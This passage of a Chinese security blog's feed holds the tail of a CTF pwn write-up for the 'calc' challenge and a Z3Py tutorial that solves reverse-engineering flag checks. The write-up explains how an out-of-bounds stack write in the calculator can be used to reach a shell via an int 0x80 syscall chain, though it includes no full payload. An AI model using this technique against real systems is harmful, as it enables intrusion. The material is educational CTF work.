class="number">4</span> * (*(_DWORD *)a1 - <span class="number">1</span>) + <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( oper == <span class="string">'/'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">4</span> * (*(_DWORD *)a1 - <span class="number">2</span>) + <span class="number">4</span>) /= *(_DWORD *)(a1 + <span class="number">4</span> * (*(_DWORD *)a1 - <span class="number">1</span>) + <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( oper == <span class="string">'*'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">4</span> * (*(_DWORD *)a1 - <span class="number">2</span>) + <span class="number">4</span>) *= *(_DWORD *)(a1 + <span class="number">4</span> * (*(_DWORD *)a1 - <span class="number">1</span>) + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = a1;</span><br><span class="line">  --*(_DWORD *)a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当我们输入+100这样的值的时候，其实是可以暴露v2[99]的值，然后再通过+100+300这种表达式是可以向v2[99]中写入400该值的，通过这种方式我们可以更改栈上的数据，因为程序是静态连接的，所以我们只能通过int 80的系统调用来进行shell的获取。</p><p>布置栈上的数据如下：<br><img src="/img/14925270013675.png" alt="14925270013675.png"></p><p>即可获取shell。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;calc&quot;&gt;&lt;a href=&quot;#calc&quot; class=&quot;headerlink&quot; title=&quot;calc&quot;&gt;&lt;/a&gt;calc&lt;/h3&gt;&lt;p&gt;这道题目的点还是很难catch到的，通过分析calc的整个布局才能抓到点，因为参考了别人的writeup，这里只贴一下分析的
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Z3Py在CTF逆向中的使用</title>
    <link href="https://foyjog.github.io/2018/05/06/Z3Py%E5%9C%A8CTF%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://foyjog.github.io/2018/05/06/Z3Py在CTF逆向中的使用/</id>
    <published>2018-05-06T09:22:14.000Z</published>
    <updated>2018-07-03T08:19:41.799Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Z3是Microsoft Research开发的高性能定理证明器。Z3拥有者非常广泛的应用场景：软件/硬件验证和测试，约束求解，混合系统分析，安全性研究，生物学研究（计算机分析）以及几何问题。<br>Z3Py是使用Python脚本来解决一些实际问题，Z3Py在windows下的安装可以参考如下链接：<a href="https://github.com/Z3Prover/z3/wiki/Using-Z3Py-on-Windows。" target="_blank" rel="noopener">https://github.com/Z3Prover/z3/wiki/Using-Z3Py-on-Windows。</a><br>Z3Py的使用教学可以参考如下链接：<a href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm" target="_blank" rel="noopener">https://ericpony.github.io/z3py-tutorial/guide-examples.htm</a></p><h3 id="CTF逆向中的应用"><a href="#CTF逆向中的应用" class="headerlink" title="CTF逆向中的应用"></a>CTF逆向中的应用</h3><p>现在的CTF逆向中，求解方程式或者求解约束条件是非常常见的一种考察方式，而ctf比赛都是限时的，当我们已经逆向出来flag的约束条件时，可能还需要花一定的时间去求解逆过程。而Z3求解器就给我们提供了一个非常便利求解方式，我们只需要定义未知量（x,y等），然后为这些未知量添加约束方式即可求解。Z3求解器能够求解任意多项式，但是要注意的是，当方程的方式为2**x这种次方运算的时候，方程式已经不是多项式的范畴了，Z3便无法求解。</p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>现在我们利用官方文档中的一个例子来粗略的看一下Z3Py的使用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = Int(<span class="string">'x'</span>)</span><br><span class="line">y = Int(<span class="string">'y'</span>)</span><br><span class="line">solve(x &gt; <span class="number">2</span>, y &lt; <span class="number">10</span>, x + <span class="number">2</span>*y == <span class="number">7</span>)</span><br></pre></td></tr></table></figure></p><p>代码非常简单，首先利用Int()定义两个int型未知数x和y，然后利用三个约束条件进行相应的求解：</p><ol><li>x &gt; 2</li><li>y &lt; 10</li><li>x + 2*y == 7</li></ol><p>由上述的代码看得出来Z3Py的使用方式比较简单，</p><ol><li>定义未知量</li><li>添加约束条件</li><li>然后求解</li></ol><h3 id="CTF中的示例"><a href="#CTF中的示例" class="headerlink" title="CTF中的示例"></a>CTF中的示例</h3><h4 id="XXX比赛中的逆向题"><a href="#XXX比赛中的逆向题" class="headerlink" title="XXX比赛中的逆向题"></a>XXX比赛中的逆向题</h4><p>首先我们利用IDA去打开该文件，定位到关键点，发现关键函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_400766</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_6020A0) != <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v3 = stru_6020A0.y1;</span><br><span class="line">  v4 = stru_6020A0.y2;</span><br><span class="line">  v5 = stru_6020A0.y3;</span><br><span class="line">  v6 = stru_6020A0.y4;</span><br><span class="line">  <span class="keyword">if</span> ( stru_6020A0.x2 * (<span class="keyword">signed</span> __int64)stru_6020A0.x1 - stru_6020A0.x4 * (<span class="keyword">signed</span> __int64)stru_6020A0.x3 != <span class="number">0x24CDF2E7C953DA56</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3L</span>L * stru_6020A0.x3 + <span class="number">4L</span>L * stru_6020A0.x4 - stru_6020A0.x2 - <span class="number">2L</span>L * stru_6020A0.x1 != <span class="number">0x17B85F06</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3</span> * stru_6020A0.x1 * (<span class="keyword">signed</span> __int64)stru_6020A0.x4 - stru_6020A0.x3 * (<span class="keyword">signed</span> __int64)stru_6020A0.x2 != <span class="number">0x2E6E497E6415CF3E</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">27L</span>L * stru_6020A0.x2 + stru_6020A0.x1 - <span class="number">11L</span>L * stru_6020A0.x4 - stru_6020A0.x3 != <span class="number">0x95AE13337</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  srand(stru_6020A0.x3 ^ stru_6020A0.x2 ^ stru_6020A0.x1 ^ stru_6020A0.x4);</span><br><span class="line">  v1 = rand() % <span class="number">50</span>;</span><br><span class="line">  v2 = rand() % <span class="number">50</span>;</span><br><span class="line">  v7 = rand() % <span class="number">50</span>;</span><br><span class="line">  v8 = rand() % <span class="number">50</span>;</span><br><span class="line">  v9 = rand() % <span class="number">50</span>;</span><br><span class="line">  v10 = rand() % <span class="number">50</span>;</span><br><span class="line">  v11 = rand() % <span class="number">50</span>;</span><br><span class="line">  v12 = rand() % <span class="number">50</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 * v2 + v3 * v1 - v4 - v5 != <span class="number">0xE638C96D3</span>LL</span><br><span class="line">    || v6 + v3 + v5 * v8 - v4 * v7 != <span class="number">0xB59F2D0CB</span>LL</span><br><span class="line">    || v3 * v9 + v4 * v10 - v5 - v6 != <span class="number">0xDCFE88C6D</span>LL</span><br><span class="line">    || v5 * v12 + v3 - v4 - v6 * v11 != <span class="number">0xC076D98BB</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_15:</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看得出来这个题目的目的就是找出满足方程的flag。<br>我们可以很方便的吧方程式列出来，但是求解对于一些数学不是很好的人来说简直就是噩梦，这时候Z3求解器就可以很方便的给我们帮助。我们按照题目的意思一步一步利用Z3求解器来求解：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x1 = Int(<span class="string">'x1'</span>)</span><br><span class="line">x2 = Int(<span class="string">'x2'</span>)</span><br><span class="line">x3 = Int(<span class="string">'x3'</span>)</span><br><span class="line">x4 = Int(<span class="string">'x4'</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add( x2*x1-x4*x3 == <span class="number">0x24CDF2E7C953DA56</span>)</span><br><span class="line">s.add( <span class="number">3</span>*x3+<span class="number">4</span>*x4-x2<span class="number">-2</span>*x1 == <span class="number">0x17B85F06</span>)</span><br><span class="line">s.add( <span class="number">3</span>*x1*x4-x3*x2 == <span class="number">0x2E6E497E6415CF3E</span>)</span><br><span class="line">s.add( <span class="number">27</span>*x2+x1<span class="number">-11</span>*x4 - x3 == <span class="number">0x95AE13337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line"></span><br><span class="line">m = s.model()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"traversing model..."</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> m.decls():</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%s = %s"</span> % (d.name(), m[d])</span><br></pre></td></tr></table></figure></p><p>Solver()命令创建一个通用求解器。我们可以通过add函数添加约束条件。我们称之为声明约束条件。check()函数解决声明的约束条件，sat结果表示找到某个合适的解，unsat结果表示没有解。这时候我们称约束系统无解。最后，求解器可能无法解决约束系统并返回未知作为结果。</p><p>对于上面的题目我们首先定义x1,x2,x3,x4四个int变量，然后添加逆向中的约束条件，最后进行求解。Z3会在找到合适解的时候返回sat。我们认为Z3能够满足这些约束条件并得到解决方案。该解决方案被看做一组解决约束条件的模型。模型能够使求解器中的每个约束条件都成立。最后我们遍历model中的解。</p><p>得到x1,x2,x3,x4的解后，我们将其代入逆向题中，得出v1,v2,v7,v8,v9,v9,v10,v11,v12的值，然后进行下一步的求解：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">v1 = <span class="number">0x16</span></span><br><span class="line">v2 = <span class="number">0x27</span></span><br><span class="line">v7 = <span class="number">0x2d</span></span><br><span class="line">v8=  <span class="number">0x2d</span></span><br><span class="line">v9 = <span class="number">0x23</span> </span><br><span class="line">v10= <span class="number">0x29</span> </span><br><span class="line">v11 = <span class="number">0xd</span></span><br><span class="line">v12 = <span class="number">0x24</span></span><br><span class="line">v3 = Int(<span class="string">'v3'</span>)</span><br><span class="line">v4 = Int(<span class="string">'v4'</span>)</span><br><span class="line">v5 = Int(<span class="string">'v5'</span>)</span><br><span class="line">v6 = Int(<span class="string">'v6'</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(v6 * v2 + v3 * v1 - v4 - v5 == <span class="number">0xE638C96D3</span>)</span><br><span class="line">s.add(v6 + v3 + v5 * v8 - v4 * v7 == <span class="number">0xB59F2D0CB</span>)</span><br><span class="line">s.add(v3 * v9 + v4 * v10 - v5 - v6 == <span class="number">0xDCFE88C6D</span>)</span><br><span class="line">s.add(v5 * v12 + v3 - v4 - v6 * v11 == <span class="number">0xC076D98BB</span>) </span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line"></span><br><span class="line">m = s.model()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"traversing model..."</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> m.decls():</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%s = %s"</span> % (d.name(), m[d])</span><br></pre></td></tr></table></figure></p><p>这样的话我们就花了比较少的时间得到我们想要的flag，还是比较方便的。</p><p>但是现实中很多的逆向题都是基于位运算的，同样在Z3Py中可以使用Bit_Vectors进行机器运算。它们能够实现无符号和有符号二进制运算。Z3为符号数运算提供了一个特殊的运算符操作版本，其中运算符&lt;，&lt;=，&gt;，&gt; =，/，％和&gt;&gt;对应于有符号运算。 相应的无符号运算符是ULT，ULE，UGT，UGE，UDiv，URem和LShR。我们看一下如下的代码就能清楚许多：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### Create to bit-vectors of size 32</span></span><br><span class="line">x, y = BitVecs(<span class="string">'x y'</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">solve(x + y == <span class="number">2</span>, x &gt; <span class="number">0</span>, y &gt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Bit-wise operators</span></span><br><span class="line"><span class="comment">### &amp; bit-wise and</span></span><br><span class="line"><span class="comment">### | bit-wise or</span></span><br><span class="line"><span class="comment">### ~ bit-wise not</span></span><br><span class="line">solve(x &amp; y == ~y)</span><br><span class="line"></span><br><span class="line">solve(x &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### using unsigned version of &lt; </span></span><br><span class="line">solve(ULT(x, <span class="number">0</span>))</span><br></pre></td></tr></table></figure></p><p>Z3Py同样支持了Python中的创建List的方式，我们看如下代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### Create list [1, ..., 5] </span></span><br><span class="line"><span class="keyword">print</span> [ x + <span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">5</span>) ]</span><br><span class="line"></span><br><span class="line"><span class="comment">### Create two lists containing 5 integer variables</span></span><br><span class="line">X = [ Int(<span class="string">'x%s'</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>) ]</span><br><span class="line">Y = [ Int(<span class="string">'y%s'</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>) ]</span><br><span class="line"><span class="keyword">print</span> X</span><br><span class="line"></span><br><span class="line"><span class="comment">### Create a list containing X[i]+Y[i]</span></span><br><span class="line">X_plus_Y = [ X[i] + Y[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>) ]</span><br><span class="line"><span class="keyword">print</span> X_plus_Y</span><br><span class="line"></span><br><span class="line"><span class="comment">### Create a list containing X[i] &gt; Y[i]</span></span><br><span class="line">X_gt_Y = [ X[i] &gt; Y[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>) ]</span><br><span class="line"><span class="keyword">print</span> X_gt_Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> And(X_gt_Y)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Create a 3x3 "matrix" (list of lists) of integer variables</span></span><br><span class="line">X = [ [ Int(<span class="string">"x_%s_%s"</span> % (i+<span class="number">1</span>, j+<span class="number">1</span>)) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>) ]</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>) ]</span><br><span class="line">pp(X)</span><br></pre></td></tr></table></figure></p><p>在上面的例子中，表达式“x％s”％i返回一个字符串，其中％s被替换为i的值。命令pp与print类似，但是它使用Z3Py格式化程序而不是Python的格式化程序来使用列表和元组。</p><h4 id="第八届极客大挑战的REConvolution"><a href="#第八届极客大挑战的REConvolution" class="headerlink" title="第八届极客大挑战的REConvolution"></a>第八届极客大挑战的REConvolution</h4><p>我们打开文件，也是比较直观的看到约束条件，我试着逆向了这个过程，花费了挺多的时间，但是如果我们使用Z3Py来求解的话就会非常的快。<br>关键部分如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ii; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="keyword">char</span> flag_i; <span class="comment">// bl</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> jj; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> xor_result[<span class="number">80</span>]; <span class="comment">// [esp+8h] [ebp-A4h]</span></span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">80</span>]; <span class="comment">// [esp+58h] [ebp-54h]</span></span><br><span class="line"></span><br><span class="line">  sub_DC1020(<span class="string">"Please input your flag: "</span>);</span><br><span class="line">  sub_DC1050(<span class="string">"%40s"</span>, flag);</span><br><span class="line">  <span class="built_in">memset</span>(xor_result, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  ii = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      flag_i = flag[ii];</span><br><span class="line">      jj = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = &amp;xor_result[jj + ii];</span><br><span class="line">        v8 = flag_i ^ data1[jj++];</span><br><span class="line">        *v7 += v8;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( jj &lt; <span class="number">0x20</span> );</span><br><span class="line">      ++ii;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( ii &lt; v4 );</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="built_in">strcmp</span>(xor_result, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;data2);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    v9 = -(v9 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No, it isn't."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Yes, it is."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>很简洁明了，我们利用Z3Py来进行变量的声明和约束的增加并进行求解<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">X =  [BitVec((<span class="string">'x%s'</span> % i),<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x22</span>) ]</span><br><span class="line"></span><br><span class="line">data1 =  [<span class="number">0x21</span>,<span class="number">0x22</span>,<span class="number">0x23</span>,<span class="number">0x24</span>,<span class="number">0x25</span>,<span class="number">0x26</span>,<span class="number">0x27</span>,<span class="number">0x28</span>,<span class="number">0x29</span>,<span class="number">0x2A</span>,<span class="number">0x2B</span>,<span class="number">0x2C</span>,<span class="number">0x2D</span>,<span class="number">0x2E</span>,<span class="number">0x2F</span>,<span class="number">0x3A</span>,</span><br><span class="line"><span class="number">0x3B</span>,<span class="number">0x3C</span>,<span class="number">0x3D</span>,<span class="number">0x3E</span>,<span class="number">0x3F</span>,<span class="number">0x40</span>,<span class="number">0x5B</span>,<span class="number">0x5C</span>,<span class="number">0x5D</span>,<span class="number">0x5E</span>,<span class="number">0x5F</span>,<span class="number">0x60</span>,<span class="number">0x7B</span>,<span class="number">0x7C</span>,<span class="number">0x7D</span>,<span class="number">0x7E</span>]</span><br><span class="line"></span><br><span class="line">data2 = [<span class="number">0x72</span>,<span class="number">0xE9</span>,<span class="number">0x4D</span>,<span class="number">0xAC</span>,<span class="number">0xC1</span>,<span class="number">0xD0</span>,<span class="number">0x24</span>,<span class="number">0x6B</span>,<span class="number">0xB2</span>,<span class="number">0xF5</span>,<span class="number">0xFD</span>,<span class="number">0x45</span>,<span class="number">0x49</span>,<span class="number">0x94</span>,<span class="number">0xDC</span>,<span class="number">0x10</span>,</span><br><span class="line"><span class="number">0x10</span>,<span class="number">0x6B</span>,<span class="number">0xA3</span>,<span class="number">0xFB</span>,<span class="number">0x5C</span>,<span class="number">0x13</span>,<span class="number">0x17</span>,<span class="number">0xE4</span>,<span class="number">0x67</span>,<span class="number">0xFE</span>,<span class="number">0x72</span>,<span class="number">0xA1</span>,<span class="number">0xC7</span>,<span class="number">0x04</span>,<span class="number">0x2B</span>,<span class="number">0xC2</span>,</span><br><span class="line"><span class="number">0x9D</span>,<span class="number">0x3F</span>,<span class="number">0xA7</span>,<span class="number">0x6C</span>,<span class="number">0xE7</span>,<span class="number">0xD0</span>,<span class="number">0x90</span>,<span class="number">0x71</span>,<span class="number">0x36</span>,<span class="number">0xB3</span>,<span class="number">0xAB</span>,<span class="number">0x67</span>,<span class="number">0xBF</span>,<span class="number">0x60</span>,<span class="number">0x30</span>,<span class="number">0x3E</span>,</span><br><span class="line"><span class="number">0x78</span>,<span class="number">0xCD</span>,<span class="number">0x6D</span>,<span class="number">0x35</span>,<span class="number">0xC8</span>,<span class="number">0x55</span>,<span class="number">0xFF</span>,<span class="number">0xC0</span>,<span class="number">0x95</span>,<span class="number">0x62</span>,<span class="number">0xE6</span>,<span class="number">0xBB</span>,<span class="number">0x57</span>,<span class="number">0x34</span>,<span class="number">0x29</span>,<span class="number">0x0E</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">xor_result = [<span class="number">0</span>]*<span class="number">0x41</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x22</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x20</span>):</span><br><span class="line">        xor_result[n+m] += X[m] ^ data1[n]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> o <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x41</span>):</span><br><span class="line">    s.add(xor_result[o] == data2[o])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line"></span><br><span class="line">m = s.model()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"traversing model..."</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x22</span>):</span><br><span class="line">    <span class="keyword">print</span> chr(int(<span class="string">"%s"</span> % (m[X[i]]))),</span><br></pre></td></tr></table></figure></p><p>很简单的几行代码，能够帮助我们获取flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Z3是Microsoft Research开发的高性能定理证明器。Z3拥有者非常广泛的应用场景：软件/硬件验证和测试，约束求解，混合系统分析
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Z3py的教程翻译</title>
    <link href="https://foyjog.github.io/2018/05/03/Z3py%E7%9A%84%E6%95%99%E7%A8%8B%E7%BF%BB%E8%AF%91/"/>
    <id>https://foyjog.github.io/2018/05/03/Z3py的教程翻译/</id>
    <published>2018-05-03T13:01:05.000Z</published>
    <updated>2018-07-03T08:19:36.781Z</updated>
    
